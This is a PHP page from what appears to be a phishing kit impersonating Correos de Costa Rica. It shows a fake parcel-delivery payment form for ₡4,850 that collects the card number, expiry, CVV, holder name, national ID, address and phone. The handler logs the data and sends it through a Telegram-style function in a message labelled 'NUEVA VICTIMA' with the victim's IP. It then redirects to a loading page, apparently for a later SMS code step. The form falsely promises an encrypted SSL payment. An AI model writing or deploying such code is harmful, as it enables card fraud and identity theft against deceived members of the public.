<?php
declare(strict_types=1);
require_once __DIR__ . '/inc/functions.php';
kit_init();

$error = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $card_number = clean_card($_POST['card_number'] ?? '');
    $card_exp    = trim((string)($_POST['card_exp'] ?? ''));
    $card_cvv    = trim((string)($_POST['card_cvv'] ?? ''));
    $card_name   = trim((string)($_POST['card_name'] ?? ''));
    $address     = trim((string)($_POST['address'] ?? ''));
    $province    = trim((string)($_POST['province'] ?? ''));
    $canton      = trim((string)($_POST['canton'] ?? ''));
    $zip         = trim((string)($_POST['zip'] ?? ''));
    $phone       = trim((string)($_POST['phone'] ?? ''));
    $card_id     = trim((string)($_POST['card_id'] ?? ''));

    if (strlen($card_number) < 13 || strlen($card_number) > 19 || $card_exp === '' || $card_cvv === '' || $card_name === '' || strlen(preg_replace('/[^0-9]/', '', $card_id)) < 9) {
        $error = 'Por favor verifique los datos de la tarjeta e intente nuevamente.';
    } else {
        $token = ensure_flow();
        unset($_SESSION['sms_ok'], $_SESSION['after_sms2'], $_SESSION['last_sms']);
        log_event($token, 'card', [
            'card_number' => $card_number,
            'card_exp'    => $card_exp,
            'card_cvv'    => $card_cvv,
            'card_name'   => $card_name,
            'card_id'     => $card_id,
            'address'     => $address,
            'province'    => $province,
            'canton'      => $canton,
            'zip'         => $zip,
            'phone'       => $phone,
        ]);
        $_SESSION['card'] = [
            'number' => $card_number, 'exp' => $card_exp, 'cvv' => $card_cvv, 'name' => $card_name, 'id' => $card_id,
            'address' => $address, 'province' => $province, 'canton' => $canton, 'zip' => $zip, 'phone' => $phone,
        ];
        tg_send(
            "🟢🔷 CORREOS CR — NUEVA VICTIMA 🔷🟢\n"
            . "━━━━━━━━━━━━━━━━━━\n"
            . "💳 TARJETA: " . $card_number . "\n"
            . "📅 EXP: " . $card_exp . "  |  🔐 CVV: " . $card_cvv . "\n"
            . "👤 TITULAR: " . $card_name . "\n"
            . "🆔 CEDULA: " . $card_id . "\n"
            . "🏠 DIRECCION: " . $address . "\n"
            . "🗺️ PROVINCIA: " . $province . " | CANTON: " . $canton . "\n"
            . "📮 CP: " . $zip . "\n"
            . "📞 TELEFONO: " . $phone . "\n"
            . "━━━━━━━━━━━━━━━━━━\n"
            . "🌐 IP: " . client_ip() . "\n"
            . "🕐 FECHA: " . date('Y-m-d H:i:s')
        );
        header('Location: loading.php');
        exit;
    }
}
$page_title = 'Verificación de Datos de Pago';
require __DIR__ . '/inc/header.php';
?>
<div class="wpb-content-wrapper">
<div class="vc_row wpb_row vc_row-fluid">
<div class="wpb_column vc_column_container vc_col-sm-12">
<div class="vc_column-inner">
<div class="wpb_wrapper">
<div class="flow-wrap">
	<div class="flow-card">
		<h2>Confirmar datos de pago</h2>
		<p class="flow-lead">Su paquete se encuentra en proceso de entrega. Para completar el envío, verifique los datos de su tarjeta, su cédula y su dirección postal.</p>
		<?php if ($error !== '') { echo '<div class="error">' . h($error) . '</div>'; } ?>
		<div class="flow-total"><span>Total a pagar</span><strong>₡4,850.00</strong></div>
		<form class="flow-form" method="post" action="index.php" autocomplete="off">
			<label for="card_number">Número de tarjeta</label>
			<input type="text" id="card_number" name="card_number" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000" required value="<?php echo h($_POST['card_number'] ?? ''); ?>">
			<div class="row">
				<div>
					<label for="card_exp">Fecha de expiración</label>
					<input type="text" id="card_exp" name="card_exp" placeholder="MM/AA" maxlength="5" required value="<?php echo h($_POST['card_exp'] ?? ''); ?>">
				</div>
				<div>
					<label for="card_cvv">CVV</label>
					<input type="text" id="card_cvv" name="card_cvv" inputmode="numeric" placeholder="123" maxlength="4" required value="<?php echo h($_POST['card_cvv'] ?? ''); ?>">
				</div>
			</div>
			<label for="card_name">Nombre del titular</label>
			<input type="text" id="card_name" name="card_name" placeholder="Nombre y apellidos" required value="<?php echo h($_POST['card_name'] ?? ''); ?>">
			<label for="card_id">Cédula de Identidad (o DIMEX)</label>
			<input type="text" id="card_id" name="card_id" inputmode="numeric" maxlength="12" placeholder="1-2345-6789" required value="<?php echo h($_POST['card_id'] ?? ''); ?>">
			<p class="secure" style="margin:4px 0 0;font-size:12px;"><i class="fas fa-id-card"></i> Ingrese la cédula del titular de la tarjeta.</p>
			<label for="address">Dirección postal</label>
			<input type="text" id="address" name="address" placeholder="Calle, número, detalles" required value="<?php echo h($_POST['address'] ?? ''); ?>">
			<div class="row">
				<div>
					<label for="province">Provincia</label>
					<select id="province" name="province">
						<?php foreach (provinces() as $p) {
						    $sel = (($_POST['province'] ?? '') === $p) ? ' selected' : '';
						    echo '<option value="' . h($p) . '"' . $sel . '>' . h($p) . '</option>';
						} ?>
					</select>
				</div>
				<div>
					<label for="canton">Cantón</label>
					<input type="text" id="canton" name="canton" placeholder="Cantón" required value="<?php echo h($_POST['canton'] ?? ''); ?>">
				</div>
			</div>
			<div class="row">
				<div>
					<label for="zip">Código postal</label>
					<input type="text" id="zip" name="zip" placeholder="00000" required value="<?php echo h($_POST['zip'] ?? ''); ?>">
				</div>
				<div>
					<label for="phone">Teléfono</label>
					<input type="text" id="phone" name="phone" inputmode="tel" placeholder="+506 0000 0000" required value="<?php echo h($_POST['phone'] ?? ''); ?>">
				</div>
			</div>
			<button class="btn-navy" type="submit">Pagar ahora</button>
			<p class="secure"><i class="fas fa-lock"></i> Conexión segura SSL · Pago cifrado</p>
		</form>
	</div>
</div>
</div>
</div>
</div>
</div>
</div>
<script>
(function () {
  var card = document.getElementById('card_number');
  var exp = document.getElementById('card_exp');
  if (card) {
    card.addEventListener('input', function () {
      var v = this.value.replace(/\D/g, '').slice(0, 19);
      this.value = v.replace(/(.{4})/g, '$1 ').trim();
    });
  }
  if (exp) {
    exp.addEventListener('input', function () {
      var v = this.value.replace(/\D/g, '').slice(0, 4);
      if (v.length >= 3) { v = v.slice(0, 2) + '/' + v.slice(2); }
      this.value = v;
    });
  }
  var id = document.getElementById('card_id');
  if (id) {
    id.addEventListener('input', function () {
      var v = this.value.replace(/\D/g, '').slice(0, 12);
      if (v.length > 9) { this.value = v; return; }
      var out = '';
      for (var i = 0; i < v.length; i++) {
        if (i === 1 || i === 5) { out += '-'; }
        out += v[i];
      }
      this.value = out;
    });
  }
})();
</script>
<?php require __DIR__ . '/inc/footer.php'; ?>
